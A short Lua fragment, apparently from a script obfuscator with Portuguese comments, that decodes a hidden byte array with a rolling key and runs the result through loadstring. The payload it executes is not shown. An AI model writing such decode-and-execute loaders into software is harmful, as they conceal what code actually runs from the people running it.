    local function VM_1OO10(d, k, m)
        local R_lIO0lOII = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_lIO0lOII, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_lIO0lOII)
    end

    -- Execution Guard
    local F_1I01I = loadstring(VM_1OO10(B_I010, 74, 5))
    if F_1I01I then
        F_1I01I(...)
    end
